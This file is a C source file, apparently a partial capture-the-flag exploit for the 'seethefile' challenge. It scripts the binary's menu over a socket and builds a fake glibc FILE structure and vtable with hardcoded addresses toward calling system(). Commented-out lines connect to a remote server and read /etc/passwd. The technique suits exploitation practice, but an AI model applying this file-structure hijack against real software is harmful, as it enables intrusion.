

#include <stdio.h>
#include "pwn.h"
#include "seethefile_cve.h"

#define CHOICE "Your choice :"

// aa
int sock_fd;

void openfile(char *fname)
{
    sendlineafter(sock_fd, CHOICE, "1", 1);
    sendlineafter(sock_fd, "What do you want to see :", fname, strlen(fname));
}

void read()
{
    sendlineafter(sock_fd, CHOICE, "2", 1);
}

void output()
{
    sendlineafter(sock_fd, CHOICE, "3", 1);
}

void close()
{
    sendlineafter(sock_fd, CHOICE, "4", 1);
}

void exit()
{
    sendlineafter(sock_fd, CHOICE, "5", 1);
}

void payload(char cont[], int count)
{
    sendlineafter(sock_fd, "Leave your name :", cont, count);
}

int main(int argc, char const *argv[])
{
    int fake_table_addr = 0x804B080 - 0x8;
    /* code */

    // sock_fd = create_socket("139.162.123.119", 10200);

    // openfile("/etc/passwd");
    // read();
    // output();
    // recvuntil(sock_fd, "Your choice :");
    // printf("%s\n", BUF);

    printf("CFILE: %d\n", sizeof(CFILE));
    printf("VTABLE: %d\n", sizeof(VTABLE_JUMP));

    // CFILE fake_file;
    // //  fake_table;

    CFILE fake_file;
    bzero(&fake_file, sizeof(fake_file));
    fake_file._flags = 0xfbad2488;
    fake_file._chain = 0xf7fcfcc0;
    fake_file._fileno = 4;
    fake_file._lock = 0x804c4a8;
    fake_file._offset = 0xffffffffffffffff;
    fake_file._wide_data = 0x804c4b4;
    fake_file._vtable_jump = fake_table_addr;

    // bzero(&fake_table, sizeof(fake_table));

    VTABLE_JUMP fake_table = {0x00000000, 0x00000000, 0xf7e88b10, 0xf7e894f0,
                              0xf7e89290, 0xf7e8a360, 0xf7e8b1f0, 0xf7e88780,
                              0xf7e883a0, 0xf7e87640, 0xf7e8a600, 0xf7e87480,
                              0xf7e87370, 0xf7e7cb40, 0xf7e88730, 0xf7e881f0,
                              0xf7e87f30, 0xf7e87450, 0xf7e881d0, 0xf7e8b380};


    int libc_base = 0xf7e20000;
    int system_addr = libc_base + 0x3a6d0;

    printf("%#llx\n", fake_file._offset);

    printf("__xsputn: %#x\n", fake_table.__xsputn);

    return 0;
}
